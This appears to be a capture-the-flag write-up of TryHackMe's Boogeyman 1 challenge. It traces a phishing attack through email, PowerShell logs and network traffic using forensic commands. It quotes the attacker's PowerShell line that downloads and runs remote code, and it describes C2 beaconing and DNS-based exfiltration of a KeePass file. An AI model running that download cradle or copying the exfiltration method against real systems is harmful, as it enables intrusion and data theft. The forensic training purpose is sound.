Boogeyman 1 - SOC Analyst Challenge
Challenge Overview
Platform: TryHackMe
Difficulty: Medium
Category: SOC Level 1 / Digital Forensics
Status: Completed

Scenario:
Julianne, a finance employee at Quick Logistics LLC, received a phishing email with a malicious attachment that compromised her workstation. The threat group "Boogeyman" is known for targeting the logistics sector.

Artefacts Provided:

dump.eml - Phishing email
powershell.json - PowerShell execution logs
capture.pcapng - Network traffic capture
Section 1: Email Analysis
Questions & Answers
Question	Answer	Command/Method
Sender email address	agriffin@bpakcaging.xyz	grep -i "^from:" dump.eml
Victim email address	julianne.westcott@hotmail.com	grep -i "^to:" dump.eml
Third-party mail relay	ElasticEmail	grep -i "dkim-signature" dump.eml
File inside attachment	Invoice_20230103.lnk	Base64 inspection
ZIP password	Invoice2023!	Email body text
Encoded payload in LNK	Base64 PowerShell download command	lnkparse Invoice_20230103.lnk
Key Findings
Typosquatting:

Legitimate: bpackaging.xyz
Malicious: bpakcaging.xyz (missing 'p')
LNK Payload:
Decoded payload downloads secondary stage:

powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
Section 2: Endpoint Security (PowerShell Logs)
Questions & Answers
Question	Answer	Method
File hosting domain	files.bpakcaging.xyz	jq '.ScriptBlockText' | grep http
C2 domain	cdn.bpakcaging.xyz	Same as above
Enumeration tool	Seatbelt	Download commands
File accessed by sq3.exe	AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite	Log analysis
Software using file	Microsoft Sticky Notes	Package name
Exfiltration tool (8 letters)	nslookup	DNS exfiltration
Attack Chain
C2 Beacon:

Domain: cdn.bpakcaging.xyz:8080
Session ID: 8cce49b0-b86459bb-27fe2489
Custom Header: X-38d2-8f49
Tools Downloaded:

sb.exe (Seatbelt) - System enumeration
sq3.exe (SQLite3) - Database queries
Data Exfiltration Methods:

HTTP POST - Command output to C2
DNS A records - File data via hex-encoded subdomains
Section 3: Network Traffic Analysis
Questions & Answers
Question	Answer	Method
Server software (6 letters)	Python	HTTP Server header
HTTP method for C2	POST	PowerShell logs
Exfiltration protocol	HTTP and DNS	Protocol analysis
Encoding used	Hex	DNS query inspection
Exfiltrated file password	From Sticky Notes	Database reconstruction
Credit card number	From KeePass	File reconstruction
File Reconstruction
Extract hex from DNS:

bash
tshark -r capture.pcapng -Y "dns.qry.type == 1 && dns.qry.name contains bpakcaging.xyz" \
  -T fields -e frame.number -e dns.qry.name | \
  grep -oP "^\d+\t\K[A-F0-9]{40,}" > ordered_hex.txt
Reconstruct file:

bash
cat ordered_hex.txt | tr -d '\n' > full_kepass.hex
xxd -r -p full_kepass.hex > protected_data.kdbx
file protected_data.kdbx
# Output: Keepass password database 2.x KDBX (13,200 bytes)
Indicators of Compromise (IOCs)
Network
bpakcaging.xyz (typosquat)
files.bpakcaging.xyz (file hosting)
cdn.bpakcaging.xyz (C2)
167.71.211.113 (C2 IP)
Files
Invoice_20230103.lnk (malicious payload)
sb.exe (Seatbelt)
sq3.exe (SQLite3)
protected_data.kdbx (exfiltrated KeePass)
Attack Timeline
Phishing email opened
LNK executes, downloads PowerShell payload
C2 beacon established
Tools downloaded (Seatbelt, SQLite3)
System enumeration
Sticky Notes queried
KeePass database exfiltrated via DNS
Command output exfiltrated via HTTP
Tools Used
jq - JSON processing
tshark - Network analysis
xxd - Hex conversion
strings - String extraction
lnkparse - LNK analysis
Wireshark - GUI packet analysis
Key Commands
Email extraction:

bash
sed -n '234,279p' dump.eml | grep -v '^$' | base64 -d > Invoice.zip
unzip -P "Invoice2023!" Invoice.zip
lnkparse Invoice_20230103.lnk
PowerShell analysis:

bash
cat powershell.json | jq -r '.ScriptBlockText' | grep -i "http\|file\|read"
Network reconstruction:

bash
tshark -r capture.pcapng -Y "dns.qry.type == 1 && dns.qry.name contains bpakcaging.xyz" \
  -T fields -e frame.number -e dns.qry.name | grep -oP "^\d+\t\K[A-F0-9]{40,}" | \
  sort -n | cut -f2 | tr -d '\n' | xxd -r -p > protected_data.kdbx
Lessons Learned
Typosquatting - Check for subtle domain misspellings
Multi-vector exfiltration - HTTP + DNS used together
DNS exfiltration - Hex-encoded queries can transfer significant data
LNK files - Can execute hidden PowerShell payloads
Legitimate tools - Seatbelt, SQLite3 repurposed for malicious use
Conclusion
The Boogeyman 1 challenge demonstrated a realistic multi-stage attack:

Initial Access: Phishing with malicious LNK
Execution: PowerShell payload
C2: HTTP beacon with custom headers
Discovery: Seatbelt enumeration
Collection: KeePass and Sticky Notes accessed
Exfiltration: HTTP POST + DNS hex encoding
Investigation required correlating evidence across email, PowerShell logs, and network traffic to reconstruct the complete attack chain.
